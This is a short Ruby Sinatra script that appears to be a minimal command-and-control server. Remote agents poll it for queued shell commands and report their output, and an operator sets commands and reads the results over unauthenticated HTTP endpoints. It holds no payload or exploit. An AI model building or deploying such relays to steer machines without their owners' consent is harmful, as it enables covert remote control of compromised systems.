require "sinatra"
require "json"

set :bind, "0.0.0.0"
set :port, 9000

$commands = {}
$results = {}

# Agent polls for commands
post "/poll" do
  id = params[:"id"]
  content_type :json
  cmd = $commands [id] || "sleep"
  { command: cmd}.to_json
end

# Agent sends back results
post "/report/:id" do 
  id = params[:id]
  data = JSON.parse(request.body.read)
  $results[id] = data["output"]
  "OK"
end

#Operator sets command
post "/set/:id" do
  id = params[:id]
  $commands[id] = params[:cmd]
  "Command set for #{id}"
end
# Operator views results
get "/results" do
  $results.to_json
end